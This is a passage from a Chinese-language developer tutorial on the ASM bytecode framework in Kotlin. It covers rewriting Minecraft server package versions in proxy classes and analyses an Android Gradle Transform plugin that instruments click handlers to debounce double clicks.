punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classVisitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> classVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> FieldVisitor <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span>fieldVisitor<span class=\"token operator\">:</span> FieldVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">FieldVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> fieldVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">val</span> nms <span class=\"token operator\">=</span> <span class=\"token string\">\"net/minecraft/server/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> obc <span class=\"token operator\">=</span> <span class=\"token string\">\"org/bukkit/craftbukkit/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>version<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>nms<span class=\"token punctuation\">,</span> <span class=\"token string\">\"net/minecraft/server/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>obc<span class=\"token punctuation\">,</span> <span class=\"token string\">\"org/bukkit/craftbukkit/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">&gt;</span> <span class=\"token function\">createProxyClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> VersionControlClassVisitor<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">getResourceAsStream</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">,</span> <span class=\"token string\">\"v1_16_R3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> MyClassLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">,</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">&gt;</span> <span class=\"token function\">createProxyInstance</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> createProxyClass<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> proxy <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    proxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面这段代码的运行结果是<code>execute successfully v1.16</code>,证明我们成功替换了代理类中的包名。</p>\n<p>其实gradle插件shadowJar重定向(relocate)包名的功能的实现也大同小异，大家有兴趣可以课下自己去实现一下。</p>\n<h5 id=\"字节码插桩\"><a href=\"#字节码插桩\" class=\"headerlink\" title=\"字节码插桩\"></a>字节码插桩</h5><p>前面几个其实并不是我们安卓开发经常遇到的问题，只是它们解决起来相对简单。安卓开发中asm框架主要是用来字节码插桩的。</p>\n<p>字节码插桩其实是hook的一种。</p>\n<p>这个我们就不自己写了，我们分析一下大佬写的案例——用字节码插桩实现双击防抖。</p>\n<p>先贴下源码链接: <a href=\"https://github.com/leavesCZY/ASM_Transform\">leavesCZY/ASM_Transform: ASM Transform 字节码插桩实战 (github.com)</a></p>\n<p>谷歌为android量身定制了安卓字节码插桩的解决方案<code>transform api</code>来配合gradle使用，<em><strong>不过它现在已经即将废弃了，最新的解决方案是Gradle提供的TransformAction</strong></em>，不过这里我们要看的源码仍然是使用transform api来实现字节码插桩，不过问题不大。</p>\n<h6 id=\"gradle插件编写\"><a href=\"#gradle插件编写\" class=\"headerlink\" title=\"gradle插件编写\"></a>gradle插件编写</h6><blockquote>\n<p>字节码插桩一般都是通过自定义gradle插件干预编译实现的</p>\n<p>准确来说是在编译后再对编译产物处理一遍</p>\n</blockquote>\n<p>首先我们新建一个<code>buildSrc</code>模块，<code>buildSrc</code>模块中的代码可以在其他模块的build.gradle中直接引入使用。</p>\n<p>然后创建一个插件类</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */</span>\n<span class=\"token keyword\">class</span> DoubleClickPlugin <span class=\"token operator\">:</span> Plugin<span class=\"token operator\">&lt;</span>Project<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>project<span class=\"token operator\">:</span> Project<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> config <span class=\"token operator\">=</span> <span class=\"token function\">DoubleClickConfig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> appExtension<span class=\"token operator\">:</span> AppExtension <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>extensions<span class=\"token punctuation\">.</span><span class=\"token function\">getByType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        appExtension<span class=\"token punctuation\">.</span><span class=\"token function\">registerTransform</span><span class=\"token punctuation\">(</span><span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>其中apply是在你导入这个插件时执行的逻辑，我们在apply方法中注册了我们写的Transform，在编译时便会执行Transform的对应逻辑。</p>\n<p>然后我们只需要在需要使用这个插件的模块导入并apply就可以了</p>\n<pre class=\"line-numbers language-groovy\" data-language=\"groovy\"><code class=\"language-groovy\"><span class=\"token keyword\">import</span> github<span class=\"token punctuation\">.</span>leavesczy<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span>doubleClick<span class=\"token punctuation\">.</span>DoubleClickPlugin\n\napply plugin<span class=\"token punctuation\">:</span> DoubleClickPlugin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"transform逻辑\"><a href=\"#transform逻辑\" class=\"headerlink\" title=\"transform逻辑\"></a>transform逻辑</h6><p>我们先来看看<code>DoubleClickTransform</code>中的内容</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">BaseTransform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ViewDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"Landroid/view/View;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OnClickViewMethodDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"(Landroid/view/View;)V\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ButterKnifeOnClickAnnotationDesc <span class=\"token operator\">=</span> <span class=\"token string\">\"Lbutterknife/OnClick;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> MethodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token operator\">:</span> Boolean\n            <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> desc <span class=\"token operator\">==</span> OnClickViewMethodDescriptor\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatCheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatUncheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>ButterKnifeOnClickAnnotationDesc<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">modifyClass</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ByteArray <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span>EXPAND_FRAMES<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> methods <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> shouldHookMethodList <span class=\"token operator\">=</span> mutableSetOf<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token comment\">//静态、包含 UncheckViewOnClick 注解的方法不用处理</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>isStatic <span class=\"token operator\">||</span>\n                    methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token comment\">//添加了 CheckViewOnClick 注解的情况</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token comment\">//使用了 ButterKnife，且当前 method 添加了 OnClick 注解</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> methodNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token comment\">//判断方法内部是否有需要处理的 lambda 表达式</span>\n                <span class=\"token keyword\">val</span> invokeDynamicInsnNodes <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                invokeDynamicInsnNodes<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">val</span> handle <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>bsmArgs<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span><span class=\"token operator\">?</span> Handle\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>handle <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> handle<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">isNotEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">val</span> argumentTypes <span class=\"token operator\">=</span> Type<span class=\"token punctuation\">.</span><span class=\"token function\">getArgumentTypes</span><span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> viewArgumentIndex <span class=\"token operator\">=</span> argumentTypes<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOfFirst</span> <span class=\"token punctuation\">{</span>\n                            it<span class=\"token punctuation\">.</span>descriptor <span class=\"token operator\">==</span> ViewDescriptor\n                        <span class=\"token punctuation\">}</span> <span class=\"token operator\">?:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>viewArgumentIndex <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token keyword\">val</span> instructions <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>instructions\n                            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>instructions <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> instructions<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                                <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> <span 